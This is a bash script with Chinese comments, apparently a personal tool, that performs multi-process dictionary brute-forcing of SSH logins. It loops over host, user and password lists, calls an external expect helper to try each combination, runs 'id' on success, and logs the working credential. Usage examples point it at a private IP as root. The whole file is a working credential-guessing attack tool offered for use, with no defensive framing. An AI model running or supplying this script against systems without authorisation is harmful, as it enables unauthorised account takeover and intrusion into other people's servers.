#!/bin/bash
#
#多进程执行使用字典进行ssh密码破解
#
#by weideguo in 20200518
#

declare -a HOST_LIST
declare HOST_LIST_NUM=0
declare -a USER_LIST
declare USER_LIST_NUM=0
declare -a PASSWD_LIST
declare PASSWD_LIST_NUM=0
#tcp超时时间
declare TCP_TIMEOUT=5
#ssh端口
declare PORT=22
#日志
declare LOGFILE="./$0.log"
#pid
declare PID=$$

declare MAX_SCAN_CONCURRENT=5


init_concurrent()
{
    local pipe_num=$1
    local v_fifofile="/tmp/${pipe_num}.fifo"
    
    if [ -f ${v_fifofile} ];then
        rm ${v_fifofile}
    fi
    
    mkfifo -m 700 ${v_fifofile}
    eval "exec ${pipe_num}<>${v_fifofile}"
    #exec ${pipe_num}<>${v_fifofile}
    rm ${v_fifofile}
    
    for k in `seq ${MAX_SCAN_CONCURRENT}`;do
        echo >&${pipe_num}
    done
    ret=$?
    if [ $ret -ne 0 ];then
        echo $ret
        echo "init concurrent failed"
        exit 1
    fi
}

wait_concurrent()
{
    local pipe_num=$1
    wait
    eval "exec ${pipe_num}>&-"
    eval "exec ${pipe_num}<&-"
}

ssh_crack()
{

    echo $@
    success_code=100
    ./ssh_expect.exp $@ 2>/dev/null 1>&2
    ret=$?
    
    if [ $ret -eq $success_code ];then
        echo $@ > $LOGFILE
        echo -e "success: \e[1;33m $@\e[0m"
        exit_all
    fi
 
}


crack()
{
    local pipe_num=6
    
    init_concurrent ${pipe_num}
    
    for host in ${HOST_LIST[*]}
    do
        for user in ${USER_LIST[*]}
		do
			for passwd in ${PASSWD_LIST[*]}
			do  
                read -u${pipe_num}
                {
                    cmd=id
                    timeout=$TCP_TIMEOUT
                    ssh_port=$PORT
                    #echo $host $user $cmd ${passwd} $timeout $ssh_port
                    #./ssh_expect.exp $host $user $passwd $cmd $timeout $ssh_port
                    ssh_crack $host $user $passwd $cmd $timeout $ssh_port
                    
                    echo >&${pipe_num}
                } &
            done
        done  
    done
    
    wait_concurrent  ${pipe_num}
}


exit_all()
{
    pstree -p $PID | awk -F"[()]" '{print $2}'| xargs kill -9 2>/dev/null 1>&2
    echo "all exit"
}


params_parse()
{
	local line tmp_list=()

	if [ ! -f $1 ]; then
		tmp_list[0]=$1
        tmp_list_num=1
	else
		tmp_list_num=0
		while read line
		do
			tmp_list[$tmp_list_num]=$line
			((++tmp_list_num))
		done < $1
	fi
	
	case $2 in
	1)
		HOST_LIST=${tmp_list[*]} 
		HOST_LIST_NUM=$tmp_list_num
		;;
	2)
		USER_LIST=${tmp_list[*]}
		USER_LIST_NUM=$tmp_list_num
		;;
	3)
		PASSWD_LIST=${tmp_list[*]}
		PASSWD_LIST_NUM=$tmp_list_num
		;;
	esac
		
}

usage()
{
echo -e "usage: \n\t$0 <-h host> <-u user> <-p passwd> [-t tcp_timeout] [-n concurrent_num] [-o port]] [-l logfile]\n"
echo "example:"
echo -e "\t$0 -h 192.168.1.128 -u root -p passwd.log"
echo -e "\t$0 -h 192.168.1.128 -u root -p passwd.log -t 5 -n 10 -o 22 -l test.log"
}

main()
{
	if [ $# -eq 0 ]; then
		usage
		exit 0
	fi
    
    #解析命令行获取参数 部分参数可以使用默认值
	while getopts "h:u:p:n:t:o:l" arg
	do
	case $arg in
        h)
            params_parse $OPTARG 1 ;;
        u)
            params_parse $OPTARG 2 ;;
		p)
			params_parse $OPTARG 3 ;;
		n)
			MAX_SCAN_CONCURRENT=$OPTARG ;;
        t)  
            TCP_TIMEOUT=$OPTARG ;; 
        o)  
            PORT=$OPTARG ;; 
        l)
            LOGFILE=$OPTARG ;; 
		?)
			usage
			exit 1
			;;
		esac
	done
    
    crack 
    
    wait

}

main $@
